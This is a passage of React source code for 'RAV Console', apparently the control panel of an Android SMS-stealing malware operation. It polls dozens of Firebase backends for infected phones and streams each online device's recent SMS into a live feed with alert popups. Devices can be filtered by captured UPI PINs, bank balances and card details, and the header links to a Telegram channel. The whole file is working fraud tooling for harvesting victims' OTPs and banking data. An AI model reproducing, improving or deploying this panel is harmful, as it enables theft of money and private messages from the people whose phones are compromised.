      const menuRef = useRef(null);

      useEffect(() => { devicesRef.current = devices; }, [devices]);
      useOutsideClick(menuRef, () => setMenuOpen(false));
      usePickerDismiss(useCallback(() => setOpenPicker(null), []));

      /* ── theme ──────────────────────────────────────────────────── */
      const applyTheme = useCallback((theme) => {
        document.body.setAttribute('data-theme', theme);
        document.body.classList.toggle('no-glow', !getPrefs().glow);
      }, []);
      useEffect(() => { applyTheme(prefs.theme); }, [prefs.theme, applyTheme]);
      useEffect(() => { document.body.classList.toggle('perf', !!prefs.perf); }, [prefs.perf]);
      const toggleTheme = () => {
        const next = prefs.theme === 'dark' ? 'light' : 'dark';
        const p = { ...prefs, theme: next };
        setPrefs(p); savePrefs(p);
      };

      /* ── derived ────────────────────────────────────────────────── */
      const serverColors = useMemo(() => {
        const map = {};
        const colors = ['#8b5cf6','#22d3ee','#ec4899','#f59e0b','#22c55e','#6366f1','#eab308','#f43f5e','#14b8a6','#a855f7'];
        servers.forEach((s, i) => { map[s.id] = s.color || colors[i % colors.length]; });
        return map;
      }, [servers]);

      const serverMap = useMemo(() => {
        const m = new Map();
        servers.forEach(s => m.set(s.id, s));
        return m;
      }, [servers]);

      const deviceCounts = useMemo(() => {
        const m = new Map();
        for (const d of devices) m.set(d.serverId, (m.get(d.serverId) || 0) + 1);
        return m;
      }, [devices]);

      const deferredSearch = useDeferredValue(search);
      const q = deferredSearch.trim().toLowerCase();

      const filtered = useMemo(() => {
        const out = [];
        for (const d of devices) {
          if (filter === 'favorite' && !favSet.has(d.key)) continue;
          if (filter === 'online' && !d.status) continue;
          if (filter === 'offline' && d.status) continue;
          if (filter === 'upi' && !d.upipin) continue;
          if (filter === 'bank' && !(d._analysis && d._analysis.bankBalances.length)) continue;
          if (filter === 'card' && !(d._analysis && d._analysis.cards.length)) continue;
          if (!['all','online','offline','upi','bank','card','favorite'].includes(filter)) {
            if (d.serverId !== parseInt(filter)) continue;
          }
          if (carrierFilter !== 'all' && carrierOf(d) !== carrierFilter) continue;
          if (q) {
            const hay = (d.name + ' ' + d.phoneNumber + ' ' + d.id).toLowerCase();
            if (!hay.includes(q)) continue;
          }
          out.push(d);
        }
        out.sort((a, b) => {
          const aFav = favSet.has(a.key), bFav = favSet.has(b.key);
          if (aFav && !bFav) return -1;
          if (!aFav && bFav) return 1;
          if (sort === 'name') return a.name.localeCompare(b.name);
          if (sort === 'battery') return b.batteryPercent - a.batteryPercent;
          if (sort === 'old') return a.id.localeCompare(b.id);
          return b.id.localeCompare(a.id);
        });
        return out;
      }, [devices, filter, carrierFilter, q, favSet, sort]);

      /* carrier breakdown + counts */
      const carrierCounts = useMemo(() => {
        const m = new Map();
        for (const d of devices) {
          const c = carrierOf(d);
          if (c) m.set(c, (m.get(c) || 0) + 1);
        }
        return m;
      }, [devices]);

      const stats = useMemo(() => {
        let online = 0, battery = 0, msgs = 0, bank = 0, card = 0, synced = 0;
        for (const d of devices) {
          if (d.status) online++;
          battery += d.batteryPercent || 0;
          if (d._analysis) {
            synced++;
            msgs += d._msgCount || 0;
            if (d._analysis.bankBalances.length) bank++;
            if (d._analysis.cards.length) card++;
          }
        }
        return {
          total: devices.length, online, offline: devices.length - online,
          avgBattery: devices.length ? Math.round(battery / devices.length) : 0,
          msgs, bank, card, synced,
        };
      }, [devices]);

      const visible = useMemo(() => filtered.slice(0, visibleCount), [filtered, visibleCount]);
      const filteredDeviceCount = useMemo(() => devices.length, [devices]);

      /* ── all-SMS feed (every firebase, every device) ───────────────
         maintained incrementally: rows are patched in place when a bulk
         sync changes a device's messages, and the flat sorted list is
         rebuilt only for that render — never on device heartbeats, so
         it can't lag the dashboard.                                    */
      const allSms = useMemo(() => {
        const m = smsRowsRef.current;
        const list = devicesRef.current;
        /* prune rows of devices that no longer exist (deleted) */
        if (deviceSetLenRef.current !== list.length) {
          deviceSetLenRef.current = list.length;
          const liveKeys = new Set(list.map(d => d.key));
          for (const k of [...m.keys()]) if (!liveKeys.has(k)) m.delete(k);
        }
        const out = [];
        for (const rows of m.values()) out.push(...rows);
        out.sort((a, b) => (b.ts || 0) - (a.ts || 0));
        return out;
      }, [smsStamp, filteredDeviceCount]);

      /* device set changed (add/delete) → re-emit the feed */
      useEffect(() => { smsStamp && setSmsStamp(s => s + 1); }, [devices.length]);

      /* stable callback + display cap for the All-SMS feed (perf mode shows fewer rows) */
      const openSmsDevice = useCallback(r => selectDevice(r.device), [selectDevice]);
      const SMS_ROW_CAP = prefs.perf ? 220 : 400;

      const smsQ = smsQuery.trim().toLowerCase();
      const smsFiltered = useMemo(() => {
        if (!smsQ) return allSms;
        return allSms.filter(r =>
          r.text.toLowerCase().includes(smsQ) ||
          String(r.sender).toLowerCase().includes(smsQ) ||
          r.device.name.toLowerCase().includes(smsQ) ||
          String(r.device.phoneNumber || '').toLowerCase().includes(smsQ)
        );
      }, [allSms, smsQ]);

      /* ── toasts ──────────────────────────────────────────────────── */
      const showToast = useCallback((text) => {
        const id = Date.now() + Math.random();
        setToasts(prev => [...prev.slice(-3), { id, text }]);
        setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 3200);
      }, []);

      /* ── popup queue ─────────────────────────────────────────────── */
      const advancePopup = useRef(null);
      advancePopup.current = () => {
        if (popupTimerRef.current) clearTimeout(popupTimerRef.current);
        if (popupQueueRef.current.length === 0) { isShowingRef.current = false; setPopupMsg(null); return; }
        const next = popupQueueRef.current.shift();
        isShowingRef.current = true;
        setPopupMsg({ ...next, exiting: false });
        popupTimerRef.current = setTimeout(() => {
          setPopupMsg(prev => prev ? { ...prev, exiting: true } : null);
          popupTimerRef.current = setTimeout(() => advancePopup.current(), 350);
        }, 4500);
      };
      const enqueuePopup = useCallback((msg) => {
        popupQueueRef.current.push(msg);
        if (popupQueueRef.current.length > 20) popupQueueRef.current.splice(0, popupQueueRef.current.length - 20);
        if (!isShowingRef.current) advancePopup.current();
      }, []);

      /* ── favourites ──────────────────────────────────────────────── */
      const toggleFav = useCallback((d) => {
        setFavSet(prev => {
          const next = new Set(prev);
          if (next.has(d.key)) next.delete(d.key); else next.add(d.key);
          saveFavoriteDevices([...next]);
          return next;
        });
      }, []);

      /* ── device fetch cycle ──────────────────────────────────────── */
      const serverCacheRef = useRef({});   // serverId → { list } — last good devices per server
      const sampleCursorRef = useRef({});  // serverId → rotating offline spot-check cursor
      const NEW_SYNC = {
        OFFLINE_SAMPLE: 6,     // rotating spot-check of offline keys per clock tick
        NEWKEY_CAP: 80,        // new device keys deep-fetched per pass
      };

      /* ── ONLINE-ONLY LIVE SYNC (light-speed mode) ─────────────────
         No device node is downloaded 24/7 anymore. Every cycle is:
           • a tiny `?shallow=true` key scan (few KB,
           • a deep refresh of ONLINE devices only (~2%),
           • deep fetch of new device keys (capped),
           • a rotating spot-check slice of offline keys so status
             flips are still noticed.
         The whole-node pass runs ONCE at boot (names/status baseline);
         steady-state never re-downloads all devices — online only.  */
      const loadAllDevices = useCallback(async (silent = false) => {
        const gen = ++fetchGenRef.current;
        const t0 = performance.now();
        const errs = {};
        const lists = new Array(servers.length);

        /* ── progressive commit — at 46+ servers results don't land at once:
              as each server answers, its devices merge in immediately (the
              skeleton clears on the first partial batch). Servers slower
              than 3s go on cooldown and reuse their last known list, so a
              single big node can't weight-lock the whole panel.          */
        let commitTimer = null;
        const commitSoon = () => {
          if (commitTimer) return;
          commitTimer = setTimeout(() => {
            commitTimer = null;
            if (gen !== fetchGenRef.current) return;
            const coll = [];
            for (let i = 0; i < servers.length; i++) {
              if (lists[i]) { coll.push(...lists[i]); continue; }
              const c = serverCacheRef.current[servers[i].id];
              if (c) coll.push(...c.list);
            }
            if (!coll.length) return;
            startTransition(() => setDevices(prev => mergeDevices(prev, coll)));
            if (!silent) setLoading(false);
            setLive('ok');   // first partial batch → panel is live (green dot)
          }, 120);
        };

        await Promise.all(servers.map((s, i) => netLimit(async () => {
          const backoff = failRef.current[s.id];
          if (backoff && backoff.until > Date.now()) { errs[s.id] = backoff.msg; lists[i] = (serverCacheRef.current[s.id] || {}).list || []; return; }
          const cached = serverCacheRef.current[s.id] || {};
          const prevList = cached.list || [];
          try {
            let next;
            /* boot only: one full baseline so names/status show instantly.
               After that this pass never runs again — the light cycle owns
               everything (online deeps + rotating offline spot-check). */
            const fullDue = !prevList.length;
            /* maps per server keep cache coherent across boot → light cycles */
            if (fullDue) {
              /* ── FULL pass: boot baseline (each device node, once) ── */
              const raw = await fbGet(s.url, s.key, 'clients');
              next = parseDevices(raw, s.id, s.name);
              serverCacheRef.current[s.id] = { list: next, coolUntil: 0 };
            } else {
              /* ── LIGHT pass: online-only sync — the whole node is never re-downloaded ── */
              const shallow = await fbGet(s.url, s.key, 'clients', { shallow: 'true' });
              const liveKeys = new Set(Object.keys(shallow || {}));
              const knownIds = new Set(prevList.map(d => d.id));
              /* devices whose node vanished → dropped (same as a full fetch would show) */
              next = prevList.filter(d => liveKeys.has(d.id));

              /* deep refresh set: believed-online + brand new keys + rotating offline sample */
              const jobs = new Set();
              for (const d of next) if (d.status) jobs.add(d.id);          // online → live data every tick
              for (const k of liveKeys) if (!knownIds.has(k)) jobs.add(k); // unseen → own names/details
              const offlineIds = next.filter(d => !d.status).map(d => d.id);
              if (offlineIds.length) {
                const cur = sampleCursorRef.current[s.id] || 0;
                for (let k = 0; k < NEW_SYNC.OFFLINE_SAMPLE && k < offlineIds.length; k++)
                  jobs.add(offlineIds[(cur + k) % offlineIds.length]);
                sampleCursorRef.current[s.id] = (cur + NEW_SYNC.OFFLINE_SAMPLE) % offlineIds.length;
              }

              const ids = [...jobs].slice(0, NEW_SYNC.NEWKEY_CAP + 400);
              for (let lo = 0; lo < ids.length; lo += 10) {   // gentle batches — host stays snappy
                const deep = await Promise.all(ids.slice(lo, lo + 10).map(async id => {
                  try {
                    const one = await fbGetTiny(s.url, s.key, 'clients/' + encodeURIComponent(id));
                    return (one && typeof one === 'object') ? parseDevices({ [id]: one }, s.id, s.name)[0] : null;
                  } catch { return null; }   // single-key blips never break the server pass
                }));
                for (const fd of deep) {
                  if (!fd) continue;
                  const at = next.findIndex(d => d.id === fd.id);
                  if (at >= 0) next[at] = fd; else next.push(fd);
                }
              }
              serverCacheRef.current[s.id] = { list: next, coolUntil: 0 };
            }
            delete failRef.current[s.id];
            lists[i] = next;
            commitSoon();
          } catch (e) {
            lists[i] = (serverCacheRef.current[s.id] || {}).list || [];   // keep last known devices during network blips
            const msg = e.message || '';
            let human;
            if (msg.includes('PERMISSION_DENIED') || msg.includes('401') || msg.includes('403')) human = `Permission Denied — use Database Secret key for "${s.name}"`;
            else if (msg.includes('404')) human = `Firebase project not found — "${s.name}"`;
            else if (msg.includes('410')) human = `Firebase project deleted — "${s.name}"`;
            else if (msg.includes('Invalid Firebase URL')) human = `Invalid URL — "${s.name}"`;
            else human = `Error: ${msg.slice(0, 90)}`;
            errs[s.id] = human;
            // dead projects get retried fast (so they can be auto-removed quickly);
            // transient/permission errors get a long backoff so we stop hammering them
            failRef.current[s.id] = { until: Date.now() + (DEAD_ERR.test(human) ? 0 : 90000), msg: human };
          }
        })));

        if (gen !== fetchGenRef.current) return;

        const nextDevices = [];
        for (const l of lists) if (l) nextDevices.push(...l);

        const orderedErrs = {};
        for (const s of servers) if (errs[s.id]) orderedErrs[s.id] = errs[s.id];
        const errKey = JSON.stringify(orderedErrs);
        setServerErrors(prev => (JSON.stringify(prev) === errKey ? prev : orderedErrs));
        if (Object.keys(orderedErrs).length === 0) setError('');
        else if (nextDevices.length === 0) setError(Object.values(orderedErrs)[0]);

        /* ── auto-remove totally dead firebase projects ───────────── */
        const deadNow = [];
        for (const s of servers) {
          const e = orderedErrs[s.id];
          if (!e) { delete deadRef.current[s.id]; continue; }
          if (!DEAD_ERR.test(e)) continue;
          const n = (deadRef.current[s.id] || 0) + 1;
          deadRef.current[s.id] = n;
          if (n >= DEAD_STRIKES) deadNow.push(s);
        }
        if (deadNow.length) {
          for (const s of deadNow) {
            delete deadRef.current[s.id];
            delete failRef.current[s.id];
            showToast(`Removed dead Firebase: ${s.name}`);
            if (onRemoveServer) onRemoveServer(s.id);
          }
        }

        setDevices(prev => mergeDevices(prev, nextDevices));

        setLatency(Math.round(performance.now() - t0));
        setLastUpdate(Date.now());
        setLive(Object.keys(orderedErrs).length && nextDevices.length === 0 ? 'err' : 'ok');
        if (!silent) setLoading(false);
        if (prevCountRef.current > 0 && nextDevices.length > prevCountRef.current) showToast('🔔 New device connected!');
        prevCountRef.current = nextDevices.length;
      }, [servers, showToast, onRemoveServer]);

      /* ── BULK SMS ENGINE ──────────────────────────────────────────
         ONLINE-ONLY message engine — the huge `messages` node is NOT
         downloaded anymore (that storm is what made everything slow).
         Only the last 30 messages of ONLINE devices are polled per
         tick, which is also all the fresh 1-hour data that exists.
         Open device is skipped (its panel polls at 1s priority).    */
      const pumpSms = useCallback(async () => {
        if (!devicesRef.current.length) return;   // devices not loaded yet → don't waste the fetch wave
        if (smsPumpBusyRef.current) return;
        smsPumpBusyRef.current = true;
        const t0 = performance.now();
        try {
          const res = new Array(servers.length);

          /* per-server progressive commit — messages apply as each firebase
             answers, so the feed fills fast at 46+ servers instead of
             waiting for the whole wave */
          const applyBatch = (batch) => {
            if (!batch.length) return;
            const full = new Map();
            for (const r of batch) {
              for (const [id, msgs] of r.map) full.set(r.serverId + ':' + id, msgs);
            }
            if (full.size === 0) return;

            const patches = new Map();
            const fresh = [];
            for (const d of devicesRef.current) {
              const msgs = full.get(d.serverId + ':' + d.id);
              if (!msgs || !msgs.length) continue;
              if (deviceOpenRef.current && deviceOpenRef.current === d.id) continue;  // panel owns this one
              const latest = { text: msgs[0].text, sender: msgs[0].sender };
              const prevText = lastMsgKeyRef.current[d.key];
              if (prevText !== undefined && prevText === latest.text && d._msgCount === msgs.length) continue; // unchanged → skip analysis entirely
              const analysis = buildSmsAnalysis(msgs);
              patches.set(d.key, { _analysis: analysis, _msgCount: msgs.length, _latest: latest, _msgs: msgs.slice(0, 60) });
              analysisTsRef.current.set(d.key, Date.now());
              lastMsgKeyRef.current[d.key] = latest.text;
              if (prevText !== undefined && prevText !== latest.text) fresh.push({ d, latest });
            }

            if (patches.size === 0) return;

            /* patch the prebuilt sms rows in place (no full rebuild) */
            const refMap = new Map(devicesRef.current.map(d => [d.key, d]));
            for (const [k, p] of patches) {
              const d = refMap.get(k);
              if (d) smsRowsRef.current.set(k, buildSmsRows({ ...d, _msgs: p._msgs }));
            }

            startTransition(() => setDevices(prev => {
              let touched = false;
              const next = prev.map(d => {
                const p = patches.get(d.key);
                if (!p) return d;
                touched = true;
                return { ...d, ...p };
              });
              return touched ? next : prev;
            }));
            setSmsStamp(s => s + 1);

            /* new-message alerts — sound always for fresh detection popup per queue */
            if (fresh.length && prefs.popups) {
              playNotifSound();
              for (let i = 0; i < fresh.length && i < 5; i++) {
                const f = fresh[i];
                if (f.d.status) enqueuePopup({ deviceName: f.d.name, sender: f.latest.sender, text: f.latest.text, status: f.d.status, device: f.d });
              }
            }
          };

          let commitTimer = null;
          const commitSoon = () => {
            if (commitTimer) return;
            commitTimer = setTimeout(() => { commitTimer = null; applyBatch(res.filter(Boolean)); }, 120);
          };

          /* per-device online-only fetches — a few hundred tiny requests
             instead of 46 multi-megabyte node downloads */
          const snapshot = serverCacheRef.current;
          await Promise.all(servers.map((server, i) => netLimit(async () => {
            const list = (snapshot[server.id] || {}).list || [];
            if (!list.length) { res[i] = { serverId: server.id, map: new Map(), err: '' }; return; }
            const online = list.filter(d => d.status).map(d => d.id);   // only online devices produce fresh SMS
            const devMap = new Map();

            /* one small fetch per online device: last 30 messages
               (strict 1-hour cutoff applied while parsing) */
            for (let lo = 0; lo < online.length; lo += 10) {
              await Promise.all(online.slice(lo, lo + 10).map(async id => {
                try {
                  const one = await fbGetTiny(server.url, server.key, `messages/${encodeURIComponent(id)}`, { orderBy: '"$key"', limitToLast: '30' });
                  const msgs = parseBulkMessages({ [id]: one }).get(id);
                  if (msgs && msgs.length) devMap.set(id, msgs);
                } catch { /* one device blip never stalls the pass */ }
              }));
            }
            res[i] = { serverId: server.id, map: devMap, err: '' };
            commitSoon();
          })));

          applyBatch(res.filter(r => r && r.map));   // final full pass
        } finally {
          bulkMsRef.current = performance.now() - t0;
          smsPumpBusyRef.current = false;
        }
      }, [servers, enqueuePopup, prefs.popups]);

      /* ── lifecycle ───────────────────────────────────────────────── */
      useEffect(() => {
        let alive = true;
        const devInterval = servers.length <= 5 ? 8000 : servers.length <= 20 ? 14000 : 16000;   // light sync → snappier ticks are affordable
        const cycle = async () => {
          if (!alive) return;
          const now = Date.now();
          // background tab → throttle hard, but never stop updating
          if (document.visibilityState === 'hidden' && now - lastDevRunRef.current < HIDDEN_DEV_INTERVAL) return;
          lastDevRunRef.current = now;
          await loadAllDevices(true);
        };
        const smsTick = async () => {
          if (!alive) return;
          const now = Date.now();
          const hidden = document.visibilityState === 'hidden';
          /* adaptive: a slow (huge messages node) bulk run stretches the next gap automatically */
          const gap = Math.max(hidden ? HIDDEN_SMS_INTERVAL : SMS_BASE_INTERVAL, bulkMsRef.current * 2);
          if (now - lastSmsRunRef.current < gap) return;
          lastSmsRunRef.current = now;
          await pumpSms();
        };
        lastDevRunRef.current = Date.now();
        lastSmsRunRef.current = Date.now();
        loadAllDevices(false);
        pumpSms();
        const devTimer = setInterval(cycle, devInterval);
        const smsTimer = setInterval(smsTick, SMS_TICK);
        const visHandler = () => {
          if (document.visibilityState === 'visible') {
            lastDevRunRef.current = 0; lastSmsRunRef.current = 0;
            loadAllDevices(true); pumpSms();
          }
        };
        document.addEventListener('visibilitychange', visHandler);
        return () => {
          alive = false;
          clearInterval(devTimer);
          clearInterval(smsTimer);
          document.removeEventListener('visibilitychange', visHandler);
          if (popupTimerRef.current) clearTimeout(popupTimerRef.current);
        };
      }, [loadAllDevices, pumpSms]);

      /* ── infinite scroll ────────────────────────────────────────── */
      useEffect(() => {
        const el = sentinelRef.current;
        if (!el) return;
        const io = new IntersectionObserver(entries => {
          if (entries[0].isIntersecting) setVisibleCount(c => Math.min(c + 48, Math.max(filtered.length, 48)));
        }, { rootMargin: '600px' });
        io.observe(el);
        return () => io.disconnect();
      }, [filtered.length]);

      useEffect(() => { setVisibleCount(48); }, [filter, carrierFilter, search]);

      /* ── misc ────────────────────────────────────────────────────── */
      const selectDevice = useCallback((d) => {
        deviceOpenRef.current = d ? d.id : null;
        setSelectedDevice(d);
        if (d) setShowWorkers(false);
      }, []);
      const closeDevice = useCallback(() => {
        deviceOpenRef.current = null;
        setSelectedDevice(null);
      }, []);
      const copySummary = useCallback(() => {
        const txt = [
          `RAV Console — ${formatClock(Date.now())}`,
          `Firebase URLs: ${servers.length}`,
          `Total: ${stats.total} | Online: ${stats.online} | Offline: ${stats.offline}`,
          `Avg battery: ${stats.avgBattery}%`,
          `Messages: ${stats.msgs} (live ${stats.synced}/${stats.total})`,
        ].join('\n');
        navigator.clipboard.writeText(txt).then(() => showToast('Summary copied to clipboard')).catch(() => showToast('Copy failed'));
      }, [servers.length, stats, showToast]);

      const selectedServer = selectedDevice ? serverMap.get(selectedDevice.serverId) : null;
      const serverFilterActive = !['all','online','offline','upi','bank','card','favorite'].includes(filter);
      const pickerLabel = serverFilterActive
        ? `${serverMap.get(parseInt(filter))?.name || 'Server'} (${deviceCounts.get(parseInt(filter)) || 0} devices)`
        : `All Servers (${servers.length})`;
      const serverFilterValue = serverFilterActive ? filter : 'all';

      const serverPickerList = () => (
        <>
          <button className={serverFilterValue === 'all' ? 'sel' : ''} onClick={() => { setFilter('all'); setOpenPicker(null); }}>
            <Icon name="Layers" className="w-4 h-4" /> All Servers ({servers.length})
          </button>
          <div className="sep" />
          {servers.map(s => (
            <button key={s.id} className={serverFilterValue === String(s.id) ? 'sel' : ''} onClick={() => { setFilter(String(s.id)); setOpenPicker(null); }}>
              <span className="w-2 h-2 rounded-full flex-shrink-0" style={{ background: serverColors[s.id] }} />
              <span className="truncate">{s.name}</span>
              <span className="ml-auto text-[11px] tx3">{deviceCounts.get(s.id) || 0}</span>
            </button>
          ))}
        </>
      );

      return (
        <div className="min-h-screen">
          {/* ══ TOP BAR ══════════════════════════════════════════ */}
          <header className="topbar">
            <button className="icon-btn" onClick={() => { if (confirm('Logout of RAV console?')) onLogout(); }} title="Logout">
              <Icon name="X" className="w-5 h-5" />
            </button>
            <h1 className="app-title flex-1 min-w-0 truncate"><BrandMark /></h1>

            <button className="icon-btn" onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })} title="Scroll to top">
              <Icon name="ChevronDown" className="w-5 h-5" />
            </button>

            <div className="relative" ref={menuRef}>
              <button className={`icon-btn ${menuOpen ? 'on' : ''}`} onClick={() => setMenuOpen(o => !o)} title="Menu">
                <Icon name="MoreVertical" className="w-5 h-5" />
              </button>
              {menuOpen && (
                <div className="dropdown right">
                  <button onClick={() => { setMenuOpen(false); loadAllDevices(false); }}><Icon name="RefreshCw" className="w-4 h-4" /> Refresh now</button>
                  <button onClick={() => { setMenuOpen(false); copySummary(); }}><Icon name="Clipboard" className="w-4 h-4" /> Copy summary</button>
                  <button onClick={() => { setMenuOpen(false); setShowWorkers(true); }}><Icon name="MessageSquare" className="w-4 h-4" /> All SMS</button>
                  <button onClick={() => { setMenuOpen(false); onBackToConnect(); }}><Icon name="Database" className="w-4 h-4" /> Switch servers</button>
                  <div className="sep" />
                  <button onClick={() => { setMenuOpen(false); const n = { ...prefs, glow: !prefs.glow }; setPrefs(n); savePrefs(n); applyTheme(n.theme); }}><Icon name="Zap" className="w-4 h-4" /> {prefs.glow ? 'Disable glow' : 'Enable glow'}</button>
                  <button onClick={() => { setMenuOpen(false); const n = { ...prefs, perf: !prefs.perf }; setPrefs(n); savePrefs(n); }}><Icon name="Activity" className="w-4 h-4" /> {prefs.perf ? 'Disable perf mode' : 'Enable perf mode'}</button>
                  <button onClick={() => { setMenuOpen(false); toggleTheme(); }}><Icon name={prefs.theme === 'dark' ? 'Sun' : 'Moon'} className="w-4 h-4" /> {prefs.theme === 'dark' ? 'Light mode' : 'Dark mode'}</button>
                  <div className="sep" />
                  <button onClick={() => { setMenuOpen(false); if (confirm('Logout?')) onLogout(); }} style={{ color: '#fb7185' }}><Icon name="LogOut" className="w-4 h-4" /> Logout</button>
                </div>
              )}
            </div>
          </header>

          <div className="shell">
            {/* ══ CONTROL BAR ═════════════════════════════════════ */}
            <div className="controlbar">
              <button className="icon-btn" onClick={() => setShowWorkers(true)} title="All SMS">
                <Icon name="PanelLeft" className="w-5 h-5" />
              </button>

              <div className="searchbox">
                <Icon name="Search" className="w-5 h-5 tx3 flex-shrink-0" />
                <input type="text" value={search} onChange={e => setSearch(e.target.value)} placeholder="Search…" />
              </div>

              <div className="relative" data-picker>
                <button className={`chip ${carrierFilter !== 'all' ? 'on' : ''}`} onClick={() => setOpenPicker(p => p === 'carrier' ? null : 'carrier')} title="Filter by network">
                  <Icon name="Signal" className="w-4 h-4 text-[#8b96f0]" />
                  {carrierFilter === 'all' ? 'Carrier' : carrierFilter}
                </button>
                {openPicker === 'carrier' && (
                  <div className="dropdown right" data-picker style={{ minWidth: 220 }}>
                    <button className={carrierFilter === 'all' ? 'sel' : ''} onClick={() => { setCarrierFilter('all'); setOpenPicker(null); }}>
                      <Icon name="Layers" className="w-4 h-4" /> All Carriers ({devices.length})
                    </button>
                    <div className="sep" />
                    {CARRIER_LIST.map(c => (
                      <button key={c} className={carrierFilter === c ? 'sel' : ''} onClick={() => { setCarrierFilter(c); setOpenPicker(null); }}>
                        <span className="w-2 h-2 rounded-full flex-shrink-0" style={{ background: CARRIER_COLORS[c] }} />
                        <span className="truncate">{c}</span>
                        <span className="ml-auto text-[11px] tx3">{carrierCounts.get(c) || 0}</span>
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </div>

            {/* ══ META ROW ════════════════════════════════════════ */}
            <div className="metabar">
              <span className="updated">Updated {lastUpdate ? formatClock(lastUpdate) : '—'}</span>
              <span className={`latpill ${latency < 1500 ? 'good' : latency < 5000 ? 'warn' : ''}`}>{latency} ms</span>
              <span className={`livedot ${live === 'ok' ? '' : live === 'err' ? 'err' : 'idle'}`} />
              <button className="chip sm" onClick={() => setShowWorkers(true)}>
                <Icon name="MessageSquare" className="w-4 h-4 text-[#8b96f0]" />
                All SMS <span className="tx3 font-bold">{allSms.length}</span>
              </button>
              <button className={`icon-btn ${prefs.theme === 'light' ? 'on' : ''}`} style={{ width: 40, height: 40 }}
                onClick={toggleTheme} title={prefs.theme === 'dark' ? 'Switch to light mode' : 'Switch to dark mode'}>
                <Icon name={prefs.theme === 'dark' ? 'Moon' : 'Sun'} className="w-4 h-4" />
              </button>
              <button className={`swtoggle ${prefs.popups ? 'on' : ''}`}
                onClick={() => {
                  const n = { ...prefs, popups: !prefs.popups };
                  setPrefs(n); savePrefs(n);
                  /* was ON → turning OFF: popups hide instantly, queue empties
                     was OFF → turning ON: new-message alerts resume automatically */
                  if (prefs.popups) {
                    popupQueueRef.current = [];
                    if (popupTimerRef.current) { clearTimeout(popupTimerRef.current); popupTimerRef.current = null; }
                    isShowingRef.current = false;
                    setPopupMsg(null);
                  }
                }}
                title={prefs.popups ? 'Turn SMS alerts off' : 'Turn SMS alerts on'}>
                <span className="swtrack" />
                <span>SMS Alert</span>
              </button>
              <div className="ml-auto flex items-center gap-2">
                <button className="icon-btn" style={{ width: 40, height: 40 }} onClick={copySummary} title="Copy summary">
                  <Icon name="Clipboard" className="w-4 h-4" />
                </button>
                <a href="https://t.me/free_netflix_accountsss" target="_blank" rel="noopener noreferrer" title="Telegram channel">
                  <span className="inline-flex items-center justify-center w-[40px] h-[40px] rounded-xl border bd2 surface hover:bg-white/[.08] transition-all">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" fill="#29a9eb" className="w-5 h-5">
                      <path d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm56.1 83.1l-21.3 100.5c-1.6 7.1-5.8 8.9-11.7 5.5l-32.4-24.1-15.7 15.1c-1.7 1.7-3.1 3.1-6.3 3.1l2.3-32.5 59.2-53.5c2.6-2.3-.6-3.6-4.1-1.3l-72.9 46.1-31.4-9.8c-6.8-2.1-6.9-6.8 1.4-10.1l121.5-46.7c5.6-2.1 10.5 1.3 8.9 9.1z" />
                    </svg>
                  </span>
                </a>
              </div>
            </div>

            <div className="hairline" />

            {/* ══ DASHBOARD STATS ═════════════════════════════════ */}
            <section>
              <h2 className="sectitle"><span className="emoji">📊</span> <span className="brandshift">Dashboard</span></h2>

              <div className="stat-grid">
                <StatCard label="TOTAL" value={stats.total.toLocaleString('en-IN')} tone="stat-total" stripe={STRIPES.a} tint={TINTS.a} />
                <StatCard label="ONLINE" value={stats.online.toLocaleString('en-IN')} tone="stat-green" stripe={STRIPES.b} tint={TINTS.b} sub={`${stats.offline.toLocaleString('en-IN')} offline`} />
                <StatCard label="OFFLINE" value={stats.offline.toLocaleString('en-IN')} tone="stat-pink" stripe={STRIPES.c} tint={TINTS.c} sub={stats.total ? Math.round((stats.offline / stats.total) * 100) + '% of total' : '—'} />
                <StatCard label="AVG BATTERY" value={`${stats.avgBattery}%`} tone="stat-indigo" stripe={STRIPES.d} tint={TINTS.d} sub={`${stats.bank} bank · ${stats.card} card`} />
                <StatCard label="TOTAL MESSAGES" value={`${stats.msgs.toLocaleString('en-IN')} messages`} tone="stat-amber" stripe={STRIPES.e} tint={TINTS.e} wide small
                  sub={`${stats.synced.toLocaleString('en-IN')} live · ${stats.total.toLocaleString('en-IN')} total devices`} />
              </div>

              <p className="tzline">Timestamps in: <b>{localTimezone()}</b></p>

              <VersionToast />

              <div className="serverrow">
                <span className="stat-label" style={{ margin: 0 }}>SERVER</span>
                <div className="relative" data-picker>
                  <button className="server-picker" onClick={() => setOpenPicker(p => p === 'server' ? null : 'server')}>
                    <Icon name="Server" className="w-5 h-5 text-[#8b96f0]" />
                    <span className="truncate">{pickerLabel}</span>
                    <Icon name="ChevronDown" className="w-5 h-5 chev" />
                  </button>
                  {openPicker === 'server' && (
                    <div className="dropdown" data-picker style={{ minWidth: 260 }}>{serverPickerList()}</div>
                  )}
                </div>
              </div>
            </section>

            {/* ══ FILTERS ═══════════════════════════════════════════ */}
            <div className="filterbar">
              {[
                { k: 'all', label: 'all' }, { k: 'online', label: 'online' }, { k: 'offline', label: 'offline' },
                { k: 'upi', label: 'upi' }, { k: 'bank', label: 'bank' }, { k: 'card', label: 'card' },
              ].map(f => (
                <button key={f.k} onClick={() => setFilter(f.k)}
                  className={`pill ${filter === f.k ? 'on' : ''} ${f.k === 'bank' ? 'green' : f.k === 'card' ? 'purple' : ''}`}>
                  {f.label}
                </button>
              ))}
              <button onClick={() => setFilter(filter === 'favorite' ? 'all' : 'favorite')}
                className={`pill ${filter === 'favorite' ? 'on yellow' : ''}`}>
                <span className="inline-flex items-center gap-1"><Icon name="Star" className="w-3 h-3" /> favorites</span>
              </button>

              <div className="flex-1" />

              <select value={sort} onChange={e => setSort(e.target.value)} className="pill" style={{ paddingRight: 10 }}>
                <option value="new">Newest</option>
                <option value="old">Oldest</option>
                <option value="name">Name</option>
                <option value="battery">Battery</option>
              </select>
              <button onClick={() => loadAllDevices(false)} className="copybtn" title="Refresh">
                <Icon name="RefreshCw" className="w-3.5 h-3.5" />
              </button>
            </div>

            {/* ══ ERROR BAR ═══════════════════════════════════════ */}
            {error && (
              <div className="flex items-start gap-3 px-4 py-3 bg-red-950/35 border border-red-900/30 rounded-xl mt-3">
                <Icon name="AlertTriangle" className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
